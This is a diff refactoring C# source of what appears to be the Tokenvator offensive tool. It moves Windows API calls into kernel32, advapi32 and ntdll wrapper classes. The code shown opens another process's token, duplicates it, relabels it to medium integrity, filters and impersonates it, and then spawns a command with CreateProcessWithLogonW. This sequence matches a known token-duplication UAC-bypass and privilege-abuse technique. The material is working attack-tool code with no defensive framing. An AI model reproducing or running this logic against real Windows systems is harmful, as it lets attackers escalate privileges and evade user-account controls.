@@ -22,7 +22,7 @@ namespace Tokenvator
             GetPrimaryToken((UInt32)processId);
             SetTokenInformation();
             ImpersonateUser();
-            CreateProcessWithLogonW(phNewToken, command, "");
+            CreateProcess.CreateProcessWithLogonW(phNewToken, command, "");
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -30,7 +30,7 @@ namespace Tokenvator
         public void GetPrimaryToken(UInt32 processId)
         {
             //Originally Set to true
-            IntPtr hProcess = Unmanaged.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, processId);
+            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, processId);
             if (hProcess == IntPtr.Zero)
             {
                 return;
@@ -38,13 +38,15 @@ namespace Tokenvator
             Console.WriteLine("[+] Recieved Handle for: " + processId);
             Console.WriteLine(" [+] Process Handle: " + hProcess.ToInt32());
 
-            if (Unmanaged.OpenProcessToken(hProcess, (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
+            if (!kernel32.OpenProcessToken(hProcess, (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
             {
-                Console.WriteLine(" [+] Primary Token Handle: " + hExistingToken.ToInt32());
+                Console.WriteLine(" [-] Unable to Open Process Token: " + hProcess.ToInt32());
+                return;
             }
-            Unmanaged.CloseHandle(hProcess);
+            Console.WriteLine(" [+] Primary Token Handle: " + hExistingToken.ToInt32());
+            kernel32.CloseHandle(hProcess);
 
-            if (!Unmanaged.DuplicateTokenEx(
+            if (!advapi32.DuplicateTokenEx(
                         hExistingToken,
                         (UInt32)(Constants.TOKEN_ALL_ACCESS),
                         IntPtr.Zero,
@@ -70,7 +72,7 @@ namespace Tokenvator
             pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
             byte nSubAuthorityCount = 1;
             IntPtr pSID = new IntPtr();
-            if (Unmanaged.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
+            if (advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
             {
                 Console.WriteLine(" [+] Initialized SID : " + pSID.ToInt32());
             }
@@ -83,7 +85,7 @@ namespace Tokenvator
             tokenMandatoryLabel.Label = sidAndAttributes;
             Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);
             
-            if (Unmanaged.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize) == 0)
+            if (ntdll.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize) == 0)
             {
                 Console.WriteLine(" [+] Set Token Information : " + phNewToken.ToInt32());
             }
@@ -93,7 +95,7 @@ namespace Tokenvator
             }
 
             IntPtr luaToken = new IntPtr();
-            if (Unmanaged.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) == 0)
+            if (ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) == 0)
             {
                 Console.WriteLine(" [+] Set LUA Token Information : " + luaToken.ToInt32());
             }
@@ -109,9 +111,9 @@ namespace Tokenvator
         {
             IntPtr luaToken = new IntPtr();
             UInt32 flags = 4;
-            Unmanaged.NtFilterToken(phNewToken, flags, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);
+            ntdll.NtFilterToken(phNewToken, flags, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);
 
-            if (!Unmanaged.DuplicateTokenEx(
+            if (!advapi32.DuplicateTokenEx(
                         phNewToken,
                         (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                         IntPtr.Zero,
@@ -124,7 +126,7 @@ namespace Tokenvator
                 return false;
             }
             Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());
-            if (!Unmanaged.ImpersonateLoggedOnUser(phNewToken))
+            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
             {
                 GetError("ImpersonateLoggedOnUser: ");
                 return false;
